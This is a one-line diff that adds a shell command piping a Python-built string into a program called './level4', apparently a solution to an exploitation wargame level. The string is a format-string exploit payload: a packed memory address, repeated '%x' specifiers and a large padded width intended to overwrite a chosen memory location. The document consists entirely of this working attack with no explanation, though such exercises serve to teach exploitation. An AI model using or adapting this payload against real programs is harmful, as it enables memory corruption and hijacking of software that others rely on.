@@ -1,0 +1,1 @@
+(python -c 'print "AAAA" + "\x10\x98\x04\x08" + "%x " * 11 + "%16930012x" + "%x"') | ./level4
